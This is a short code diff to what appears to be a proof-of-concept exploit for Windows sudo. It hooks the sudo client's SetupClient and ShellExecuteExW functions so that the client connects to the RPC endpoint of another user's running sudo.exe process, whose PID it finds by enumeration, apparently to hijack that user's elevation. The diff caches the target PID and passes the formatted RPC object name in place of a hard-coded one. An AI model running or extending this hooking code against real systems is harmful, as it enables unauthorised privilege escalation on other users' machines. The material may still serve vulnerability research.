@@ -20,6 +20,7 @@ typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);
 
 fnSetupClient_t OriginalSetupClient = NULL;
 char g_CurrentUser[UNLEN];
+DWORD g_targetPID = NULL;
 
 
 DWORD FindRunningSudo() {
@@ -81,13 +82,12 @@ unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
     // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
     char target_rpc_object[260];
     OutputDebugStringA("Finding target PID...\n");
-    DWORD target_pid = FindRunningSudo();
-    while (target_pid == NULL) {
-        target_pid = FindRunningSudo();
+    while (g_targetPID == NULL) {
+        g_targetPID = FindRunningSudo();
     }
-    snprintf(target_rpc_object, 260, kSudoRpcFormat, target_pid);
+    snprintf(target_rpc_object, 260, kSudoRpcFormat, g_targetPID);
     OutputDebugStringA(target_rpc_object);
-    return OriginalSetupClient("sudo_elevate_9868\n");
+    return OriginalSetupClient(target_rpc_object);
 }
 
 BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
